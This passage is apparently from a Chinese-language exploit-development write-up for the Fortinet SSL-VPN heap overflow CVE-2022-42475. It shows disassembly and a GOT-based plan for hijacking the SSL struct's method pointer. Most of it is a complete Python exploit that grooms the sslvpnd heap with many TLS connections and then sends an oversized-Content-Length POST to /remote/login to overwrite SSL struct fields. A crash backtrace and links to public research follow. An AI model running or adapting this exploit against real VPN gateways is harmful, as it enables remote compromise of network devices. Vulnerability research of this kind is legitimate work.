   0x7f3bd7f44e63:	pop    r15
   0x7f3bd7f44e65:	jmp    rax
   0x7f3bd7f44e67:	nop    WORD PTR [rax+rax*1+0x0]
   0x7f3bd7f44e70:	mov    r8d,0x6d4
```

$rax 为 s->method 的地址。通过got表，我们可以找到

```
.got.plt:0000000003EFEDA0 off_3EFEDA0     dq offset SSL_do_handshake
```

那么我们将s->method的地址设置为0x0000000003EFEDA0 - 0x38 = 0x3EFED68

会奔溃，

当流程到达：SSL_do_handshake时，会调用 s->method->ssl_renegotiate_check(s, 0)，由于我们将s->method的地址设置为0x3EFED68后，s->method->ssl_renegotiate_check(s, 0)最终会调用ldap_first_entry，造成崩溃

```python
#!/usr/bin/python3
from pwn import *
import threading
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib
import math
import random
import string
import struct
import subprocess

"""
handle SIGPIPE nostop

break *SSL_new + 0x35
commands
	printf "ssl alloc addr:%p\n",$rax 
	continue
end

b *0x000000000171A602 
commands
	printf "read_post_data alloc addr:%p\n",$rax
	continue
end
"""

SSLVPND_WORKER_COUNT = 1
PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT = 71
SSL_STRUCT_SIZE = 0x1c00
CONTENT_LEN = (((SSL_STRUCT_SIZE-24)>>3)-1)<<3
HOST = "192.168.182.188"
PORT = 8443  

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

def attack(sock):
    data =  ("POST %s HTTP/1.1\r\n"%("/remote/login")).encode()
    data += ("Host: %s:%d\r\n"%(HOST,PORT)).encode()
    data += ("User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r\n").encode()
    data += ("Content-Type: text/plain;charset=UTF-8\r\n").encode()
    data += ("Content-Length: %d\r\n"%(CONTENT_LEN|0x100000000)).encode()
    data += ("Connection: keep-alive\r\n").encode()
    data += ("\r\n").encode()
    data += b'A'*7144
    data += b"\x01\x00\x00\x00\x00\x00\x00\x00" #s->version
    data += b"\x68\xED\xEF\x03\x00\x00\x00\x00" #s->method
    data += b'\x00'*32
    data += b"\x03\x00\x00\x00\x00\x00\x00\x00" #s->handshake_func
    data += b"\x01\x00\x00\x00\x00\x00\x00\x00" #s->server
    data += b'\x00'*4
    data += b'\x00'*4                           #s->shutdown
    data += b'\x01'*60                          # 顺便设置 init为1
    data += b'\x00'*4                           #s->early_data_state
    data += b'\x00'*1361                        
    data += b'\x00'*4                           #s->mode
    sock.sendall(data)


socks = []
for i in range(SSLVPND_WORKER_COUNT*PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT):
    sk = create_ssl_socket()
    socks.append(sk)

close_socks_index = (PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT//2)*SSLVPND_WORKER_COUNT
close_socks = []
for i in range(close_socks_index,close_socks_index + SSLVPND_WORKER_COUNT*2):
    close_socks.insert(0,socks[i])

victim_socks = []
for i in range(close_socks_index + SSLVPND_WORKER_COUNT*2,close_socks_index + SSLVPND_WORKER_COUNT*3):
    victim_socks.append(socks[i])

for sk in close_socks:
    sk.close()

attack_socks = []
for i in range(SSLVPND_WORKER_COUNT):
    sk = create_ssl_socket()
    attack_socks.append(sk)

attack_sock_threads = []
for i in range(SSLVPND_WORKER_COUNT):
    thread = threading.Thread(target=attack,args=(attack_socks[i],))
    attack_sock_threads.append(thread)
    thread.start()

for thread in attack_sock_threads:
    thread.join()

#wait for attack packet send to server and be handle
#then trigger SSL_read
time.sleep(5)
for sk in victim_socks:
  sk.sendall(b"a")

print("miaomiaomiao?")
while True:
    time.sleep(3)
```

崩溃：

```
#0  0x00007f3bd7cccdd0 in ldap_first_entry () from /usr/lib/x86_64-linux-gnu/libldap-2.5.so.0
#1  0x00007f3bd7f475c9 in SSL_do_handshake () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#2  0x00007f3bd7f44f83 in SSL_read () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
```

```c
/* ARGSUSED */
LDAPMessage *
ldap_first_entry( LDAP *ld, LDAPMessage *chain )
{
	assert( ld != NULL );
	assert( LDAP_VALID( ld ) );
	assert( chain != NULL );

	return chain->lm_msgtype == LDAP_RES_SEARCH_ENTRY
		? chain
		: ldap_next_entry( ld, chain );
}
```



# 资料

A More Complete Exploit for Fortinet CVE-2022-42475

https://bishopfox.com/blog/exploit-cve-2022-42475

We're Out Of Titles For VPN Vulns - It's Not Funny Anymore (Fortinet CVE-2022-42475)

https://labs.watchtowr.com/fortinet-no-more-funny-titles-cve-2022-42475/

Fortinet Series 3 — CVE-2022–42475 SSLVPN exploit strategy

https://medium.com/@INTfinitySG/fortinet-series-3-cve-2022-42475-sslvpn-exploit-strategy-2578597f892f